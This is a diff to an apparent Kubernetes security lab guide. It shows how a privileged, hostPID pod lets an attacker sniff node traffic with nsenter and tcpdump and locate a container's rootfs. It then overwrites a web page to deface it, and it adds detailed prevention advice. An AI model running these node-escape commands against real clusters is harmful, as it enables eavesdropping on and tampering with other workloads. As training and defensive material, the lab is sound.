@@ -115,10 +115,21 @@ Since we have `privileged` access and `hostPID`, we can jump into the Node's **N
     # -t 1 : Target PID 1 (Host)
     # -n   : Enter Network Namespace
     # -i any : Listen on all interfaces (eth0, cni0, veth...)
-    nsenter -t 1 -n tcpdump -i any -nn port 80
+    nsenter -t 1 -n tcpdump -i any -nn port 80 -A
     ```
 
     *Try generating some traffic in another terminal (e.g., `kubectl run curl --image=curlimages/curl -- curl http://demo-app.battleground.svc`) and watch the packets flow!*
+
+    **Sample Output:**
+    ```
+    11:10:24.170192 ... HTTP: GET / HTTP/1.1
+    Host: demo-service.battleground.svc
+    ...
+    11:10:24.191865 ... HTTP: HTTP/1.1 200 OK
+    Server: nginx/1.29.3
+    ...
+    <h1>Welcome to nginx!</h1>
+    ```
 
 ### 3.5. Direct Filesystem Access (Bypassing "Distroless")
 
@@ -130,27 +141,26 @@ Since we are on the Node, we can find where the container's filesystem is stored
     We need the Container ID of the target pod (e.g., `demo-app`).
     ```bash
     # Use crictl to find the container ID for 'demo-app'
-    chroot /host crictl ps --name demo-app
+    chroot /host crictl ps --name demo-app -q
     ```
-    *Copy the CONTAINER ID (e.g., `a1b2c3d4e5...`).*
+    *Output example: `0ac60e8590d7c...`*
 
 2.  **Find the Mount Point:**
     Inspect the container to find its root filesystem path.
+    
+    *Note: In some containerd setups (like Kind), `crictl inspect` might not show `mergedDir` directly. We can find it in the standard path:*
     ```bash
-    # Replace <CONTAINER_ID> with the actual ID
-    chroot /host crictl inspect <CONTAINER_ID> | grep "mergedDir"
+    # Find the rootfs path using the Container ID
+    find /host/run/containerd/io.containerd.runtime.v2.task/k8s.io -name rootfs | grep <CONTAINER_ID>
     ```
-    You will see something like: `"mergedDir": "/var/lib/containerd/io.containerd.grpc.v1.cri/sandboxes/.../rootfs"`
+    *Output example: `/host/run/containerd/io.containerd.runtime.v2.task/k8s.io/0ac60e859.../rootfs`*
 
 3.  **Access the Files:**
-    Now you can just `cd` into that directory (prefixed with `/host` since we mounted the host root there).
+    Now you can just `cd` into that directory.
 
     ```bash
-    # Example (adjust path based on output above):
-    ls -l /host/var/lib/containerd/.../rootfs/usr/share/nginx/html/
-    
     # Modify the index.html directly!
-    echo "<h1>Hacked by Node Admin</h1>" > /host/var/lib/containerd/.../rootfs/usr/share/nginx/html/index.html
+    echo "<h1>Hacked by Node Admin</h1>" > /host/run/containerd/.../rootfs/usr/share/nginx/html/index.html
     ```
 
     **Impact:**
@@ -158,9 +168,21 @@ Since we are on the Node, we can find where the container's filesystem is stored
     - Modify application code or static assets (Defacement).
     - Inject malware into running containers.
 
-## 4. Fix
+## 4. Fix & Prevention
 
-- **Restrict HostPath:** Use Policy (PSS/OPA) to block `hostPath` mounts, especially for `/`, `/etc`, and `/var`.
-- **Rotate Credentials:** If a node is compromised, rotate the Kubelet certificates immediately.
-- **Node Isolation:** Ensure Kubelet credentials only have permissions for *that specific node* (NodeAuthorizer).
-- **File Integrity Monitoring (FIM):** Monitor `/etc/kubernetes` and `/etc/cron.d` for unauthorized changes.
+### 4.1. Preventing Node Access (The Root Cause)
+The best defense is to prevent the attacker from getting `root` on the node in the first place.
+- **Enforce Pod Security Standards (PSS):** Set the policy to `Restricted` to block `privileged: true`, `hostPID: true`, and `hostPath` mounts.
+- **Use Read-Only Root Filesystem:** Configure pods with `readOnlyRootFilesystem: true`.
+
+### 4.2. Defending Against Persistence (Static Pods)
+- **File Integrity Monitoring (FIM):** Monitor `/etc/kubernetes/manifests` for new file creations. Tools like Falco or OSSEC can alert on this.
+- **Node Hardening:** Ensure the `/etc/kubernetes` directory is writable only by `root` (which we were, unfortunately).
+
+### 4.3. Defending Against Sniffing (mTLS)
+- **Encrypt East-West Traffic:** Use a Service Mesh (Istio, Linkerd, Consul) to enforce mTLS between pods. Even if an attacker sniffs the traffic on the node, they will only see encrypted packets.
+
+### 4.4. Defending Against Direct FS Access
+- **Runtime Security:** Use tools like **Falco** or **Tetragon** to detect unexpected file writes to sensitive paths (like `/run/containerd/...`).
+- **Immutable Infrastructure:** Treat nodes as immutable. If a node is compromised, kill it and replace it. Don't try to clean it.
+
